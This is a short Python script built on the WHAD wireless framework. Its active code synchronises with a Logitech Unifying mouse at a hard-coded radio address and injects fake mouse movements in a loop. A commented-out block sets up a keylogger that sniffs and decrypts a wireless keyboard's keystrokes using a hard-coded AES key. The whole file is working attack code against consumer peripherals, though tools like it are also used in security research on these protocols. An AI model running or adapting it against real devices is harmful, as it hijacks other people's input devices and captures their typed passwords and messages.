from whad.unifying import Keylogger, Mouselogger, Mouse
from whad.device import WhadDevice
from whad.exceptions import WhadDeviceNotFound
from whad.scapy.layers.esb import ESB_Hdr
from scapy.compat import raw
import sys,time

def show(pkt):
    print(repr(pkt))

if __name__ == '__main__':
    if len(sys.argv) >= 2:
        # Retrieve target interface
        interface = sys.argv[1]

        # Connect to target device and performs discovery
        try:
            dev = WhadDevice.create(interface)

            connector = Mouse(dev)
            connector.attach_callback(show)
            connector.start()
            connector.address = "ca:e9:06:ec:a4"
            connector.synchronize()

            while True:
                print("move")
                connector.move(2, -1)
                time.sleep(1)
            '''
            connector = Keylogger(dev)
            connector.address = "9b:0a:90:42:8c"
            connector.scanning = True
            connector.decrypt = True

            connector.add_key(bytes.fromhex("08f59b42da6fdc9bcd88654d5f19400d"))
            connector.start()
            out = ""
            for i in connector.sniff():
                out += i
                print(out)
            '''
            while True:
                input()

        except (KeyboardInterrupt, SystemExit):
            dev.close()

        except WhadDeviceNotFound:
            print('[e] Device not found')
            exit(1)
    else:
        print('Usage: %s [device]' % sys.argv[0])
